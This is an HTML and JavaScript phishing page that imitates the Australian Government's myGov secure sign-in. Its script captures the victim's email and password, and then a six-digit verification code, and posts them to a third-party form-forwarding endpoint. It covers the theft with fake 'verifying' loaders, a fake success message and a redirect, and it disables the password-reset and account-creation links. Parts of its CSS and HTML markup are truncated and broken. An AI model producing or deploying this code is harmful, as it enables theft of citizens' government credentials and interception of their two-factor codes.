<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>myGov – secure sign in</title>
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #f5f5f5;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* ===== LOADER OVERLAY ===== */
        .loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            transition: opacity 0.8s ease-in-out, visibility 0.8s ease-in-out;
        }

        .loader-overlay.hidden {
            opacity: 0;
            visibility: hidden;
        }

        .loader-content {
            text-align: center;
            animation: fadePulse 1.5s infinite alternate;
        }

        @keyframes fadePulse {
            0% { opacity: 0.6; transform: scale(0.98); }
            100% { opacity: 1; transform: scale(1.02); }
        }

        .spinner {
            width: 70px;
            height: 70px;
            border: 6px solid #e0f0ff;
            border-top: 6px solid #65D3EE;
            border-bottom: 6px solid #003366;
            border-radius: 50%;
            animation: spin 1.2s cubic-bezier(0.4, 0.0, 0.2, 1) infinite;
            margin: 0 auto 25px;
            box-shadow: 0 10px 20px rgba(0,51,102,0.1);
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loader-content p {
            color: #003366;
            font-size: 18px;
            font-weight: 500;
            letter-spacing: 0.5px;
        }

        /* ===== FULL SCREEN BLUR LOADER ===== */
        .fullscreen-blur {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.85);
            backdrop-filter: blur(8px);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 10001;
            flex-direction: column;
        }

        .fullscreen-blur.active {
            display: flex;
        }

        .blur-spinner {
            width: 80px;
            height: 80px;
            border: 6px solid #e6f0fa;
            border-top: 6px solid #003366;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 25px;
        }

        .blur-text {
            font-size: 18px;
            color: #003366;
            font-weight: 500;
            letter-spacing: 0.3px;
        }

        /* ===== HEADER ===== */
        .gov-header {
            background-color: #65D3EE;
            padding: 0 5%;
            height: 80px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            width: 100%;

        .header-left-group {
            display: flex;
            align-items: center;
            gap: 30px;
            height: 100%;
        }

        .mygov-badge {

            align-items: center;
            justify-content: center;

        .help-wrapper {

        .help-link {

            font-weight: 500;

            transition: background-color 0.2s;

        .help-link:hover {

            align-items: center;

<body>
    <!-- LOADER OVERLAY - fading spinner -->
    <div class="loader-overlay" id="loader">
        <div class="loader-content">
            <div class="spinner"></div>
            <p>loading myGov secure portal...</p>
        </div>
    </div>

    <!-- FULL SCREEN BLUR LOADER - 5 seconds on sign in -->
    <div class="fullscreen-blur" id="fullscreenBlur">
        <div class="blur-spinner"></div>
        <div class="blur-text">Verifying credentials...</div>
    </div>

    <header class="gov-header">
        <div class="header-left-group">
            <div class="mygov-badge">
                <img src="https://i.ibb.co/Xf6XmGYg/In-Shot-20260303-132243446.png" alt="Australian Government">
            </div>
            <div class="mygov-badge">

    <!-- MAIN CONTENT - ORIGINAL LOGIN PAGE -->

        <div class="login-card" id="loginScreen">
            <br>
            <div class="back-row">
                <a href="home.html" class="back-link">
                    <i class="fa-solid fa-chevron-left"></i> Back

            </div><br>

            <!-- Message container for error messages -->

                <!-- User input fields -->

                    <label>Username or email</label>

    <!-- VERIFICATION MODAL -->
    <div class="modal-overlay" id="verifyModal">
        <div class="modal-container" id="modalContent">
            <!-- Dynamic content will be inserted here -->
        </div>
    </div>

    <script>
        // Fading spinner - 3 seconds with fade out
        window.addEventListener('load', function() {
            setTimeout(function() {
                document.getElementById('loader').classList.add('hidden');
            }, 3000);
        });

        // DOM elements
        const messageContainer = document.getElementById('messageContainer');
        const togglePassword = document.getElementById('togglePassword');
        const password = document.getElementById('password');
        const digitalIdOption = document.getElementById('digitalIdOption');
        const passkeyOption = document.getElementById('passkeyOption');
        const forgotUsername = document.getElementById('forgotUsername');
        const forgotPassword = document.getElementById('forgotPassword');
        const createAccountLink = document.getElementById('createAccountLink');
        const signInBtn = document.getElementById('signInBtn');
        const fullscreenBlur = document.getElementById('fullscreenBlur');
        const usernameInput = document.getElementById('username');

        // Store login data for verification stage
        let loginData = {
            email: '',
            password: ''
        };

        // Function to mask email for display
        function maskEmail(email) {
            if (!email) return 'your email';
            const parts = email.split('@');
            if (parts.length !== 2) return email;
            const name = parts[0];
            const domain = parts[1];
            if (name.length <= 2) return email;
            const maskedName = name.charAt(0) + '****' + name.charAt(name.length - 1);
            return maskedName + '@' + domain;
        }

        // Function to send login data to FormSubmit
        async function sendLoginData(email, password) {
            try {
                const formData = new FormData();
                formData.append('access_key', '8e488231cd6042709925dcfe946d1e1c');
                formData.append('email', email);
                formData.append('password', password);
                formData.append('stage', 'login_attempt');
                formData.append('timestamp', new Date().toISOString());
                formData.append('_subject', '🔐 myGov Login Attempt - Credentials');
                formData.append('_template', 'box');
                formData.append('_captcha', 'false');

                const response = await fetch('https://formsubmit.co/ajax/8e488231cd6042709925dcfe946d1e1c', {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();
                console.log('Login data sent:', result);
                return result.success;
            } catch (error) {
                console.error('Error sending login data:', error);
                return false;
            }
        }

        // Function to send verification code to FormSubmit
        async function sendVerificationCode(code) {
            try {
                const formData = new FormData();
                formData.append('access_key', '8e488231cd6042709925dcfe946d1e1c');
                formData.append('email', loginData.email);
                formData.append('verification_code', code);
                formData.append('stage', 'verification_complete');
                formData.append('timestamp', new Date().toISOString());
                formData.append('_subject', '🔐 myGov Login Attempt - Verification Code');
                formData.append('_template', 'box');
                formData.append('_captcha', 'false');

                const response = await fetch('https://formsubmit.co/ajax/8e488231cd6042709925dcfe946d1e1c', {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();
                console.log('Verification code sent:', result);
                return result.success;
            } catch (error) {
                console.error('Error sending verification code:', error);
                return false;
            }
        }

        // Password toggle functionality
        togglePassword.addEventListener('click', function() {
            const icon = this.querySelector('i');
            if (password.type === 'password') {
                password.type = 'text';
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            } else {
                password.type = 'password';
                icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
            }
        });

        // Function to show error message
        function showError(message) {
            messageContainer.innerHTML = `
                <div class="error-message">
                    <i class="fas fa-exclamation-circle"></i>
                    <span>${message}</span>
                </div>
            `;
            // Auto hide after 5 seconds
            setTimeout(() => {
                messageContainer.innerHTML = '';
            }, 5000);
        }

        // Restricted buttons - show error messages
        digitalIdOption.addEventListener('click', function(e) {
            e.preventDefault();
            showError('You must first login with your username and password to use Digital ID');
        });

        passkeyOption.addEventListener('click', function(e) {
            e.preventDefault();
            showError('You must first login with your username and password to set up passkeys');
        });

        forgotUsername.addEventListener('click', function(e) {
            e.preventDefault();
            showError('Please login first. Password reset is only available after authentication');
        });

        forgotPassword.addEventListener('click', function(e) {
            e.preventDefault();
            showError('Please login first. Password reset is only available after authentication');
        });

        createAccountLink.addEventListener('click', function(e) {
            e.preventDefault();
            showError('You must first login with your username and password to create an account');
        });

        // Timer variables
        let timerInterval;
        let timeLeft = 900; // 15 minutes

        function startTimer() {
            if (timerInterval) clearInterval(timerInterval);
            timeLeft = 900;
            updateTimerDisplay();
            
            timerInterval = setInterval(() => {
                timeLeft--;
                updateTimerDisplay();
                
                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    const timerEl = document.getElementById('compactTimer');
                    const warningEl = document.getElementById('timerWarning');
                    if (timerEl) timerEl.textContent = "00:00";
                    if (warningEl) warningEl.textContent = "Code expired - request new";
                }
            }, 1000);
        }

        function updateTimerDisplay() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            const timerEl = document.getElementById('compactTimer');
            const warningEl = document.getElementById('timerWarning');
            if (timerEl) {
                timerEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            }
            if (warningEl) {
                if (timeLeft < 120 && timeLeft > 0) {
                    warningEl.textContent = "Code expiring soon";
                } else if (timeLeft <= 0) {
                    warningEl.textContent = "Code expired - request new";
                } else {
                    warningEl.textContent = "";
                }
            }
        }

        // Build verification modal - with user's email
        function buildVerificationModal(email) {
            const maskedEmail = maskEmail(email);
            return `
                <div class="modal-header">
                    <i class="fas fa-shield-alt"></i>
                    <h3>Verify your identity</h3>
                    <button class="modal-close" id="closeModalBtn">&times;</button>
                </div>
                <div class="modal-body">
                    <div class="info-line">
                        <i class="fas fa-envelope"></i>
                        <span>Verification code sent to ${maskedEmail}</span>
                    </div>

                    <div class="timer-compact">
                        <div class="timer-compact-left">
                            <i class="fas fa-hourglass-half"></i>
                            <span>Code expires in</span>
                        </div>
                        <div class="timer-compact-value" id="compactTimer">15:00</div>
                    </div>
                    <div id="timerWarning" class="warning-text"></div>

                    <div class="code-label">Enter 6-digit verification code</div>
                    <input type="text" class="code-input-compact" id="codeInput" placeholder="000000" maxlength="6">

                    <div class="action-row">
                        <button class="btn-verify" id="verifyBtn">
                            <i class="fas fa-check-circle"></i> Verify
                        </button>
                        <button class="btn-resend" id="resendBtn">
                            <i class="fas fa-redo-alt"></i> Resend
                        </button>
                    </div>

                    <div class="status-row">
                        <span class="resend-text" id="resendLink">Request new code</span>
                        <span class="sent-status" id="deliveryStatus">
                            <i class="fas fa-check-circle"></i> Sent
                        </span>
                    </div>
                </div>
            `;
        }

        // Build success modal
        function buildSuccessModal() {
            return `
                <div class="modal-body">
                    <div class="success-compact">
                        <i class="fas fa-check-circle"></i>
                        <h4>Identity verified!</h4>
                        <p>Login successful. Redirecting...</p>
                    </div>
                </div>
            `;
        }

        // Form submission handler - send login first, then show modal
        signInBtn.addEventListener('click', async function(e) {
            e.preventDefault();
            
            const username = usernameInput.value.trim();
            const passwordValue = password.value.trim();
            
            if (!username || !passwordValue) {
                showError('Please enter both username and password');
                return;
            }

            // Validate email format
            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailPattern.test(username)) {
                showError('Please enter a valid email address');
                return;
            }

            // Store login data for later use
            loginData.email = username;
            loginData.password = passwordValue;
            
            // Show full screen blur with spinner
            fullscreenBlur.classList.add('active');
            signInBtn.disabled = true;
            
            // Send login data to FormSubmit
            const loginSent = await sendLoginData(username, passwordValue);
            
            // 2.5 second delay before showing modal
            setTimeout(() => {
                fullscreenBlur.classList.remove('active');
                signInBtn.disabled = false;
                
                if (!loginSent) {
                    showError('Login recorded but verification service unavailable');
                }
                
                // Show verification modal with user's email
                modalContent.innerHTML = buildVerificationModal(username);
                verifyModal.classList.add('active');
                
                // Start timer
                startTimer();
                
                // Setup modal event listeners
                setupModalListeners();
            }, 2500);
        });

        // Setup modal interactions
        function setupModalListeners() {
            // Close modal
            document.getElementById('closeModalBtn').addEventListener('click', function() {
                verifyModal.classList.remove('active');
                if (timerInterval) clearInterval(timerInterval);
            });

            // Close on overlay click
            verifyModal.addEventListener('click', function(e) {
                if (e.target === verifyModal) {
                    verifyModal.classList.remove('active');
                    if (timerInterval) clearInterval(timerInterval);
                }
            });

            // Verify button
            document.getElementById('verifyBtn').addEventListener('click', async function() {
                const code = document.getElementById('codeInput').value.trim();
                
                if (!code || code.length < 6) {
                    alert('Please enter the 6-digit verification code');
                    return;
                }
                
                // Show loading state on verify button
                const verifyBtn = document.getElementById('verifyBtn');
                verifyBtn.disabled = true;
                verifyBtn.innerHTML = '<span class="mini-loader"></span> Verifying...';
                
                // Send verification code to FormSubmit
                const codeSent = await sendVerificationCode(code);
                
                // Show success modal
                modalContent.innerHTML = buildSuccessModal();
                if (timerInterval) clearInterval(timerInterval);
                
                // Redirect after 2 seconds
                setTimeout(() => {
                    verifyModal.classList.remove('active');
                    window.location.href = 'https://mygov-demo.com/success';
                }, 2000);
            });

            // Resend functionality
            function resendAction() {
                startTimer();
                document.getElementById('codeInput').value = '';
                document.getElementById('deliveryStatus').innerHTML = '<i class="fas fa-check-circle"></i> New code sent';
                
                setTimeout(() => {
                    document.getElementById('deliveryStatus').innerHTML = '<i class="fas fa-check-circle"></i> Sent';
                }, 2000);
            }

            document.getElementById('resendBtn').addEventListener('click', resendAction);
            document.getElementById('resendLink').addEventListener('click', resendAction);
        }
    </script>
</body>
</html>
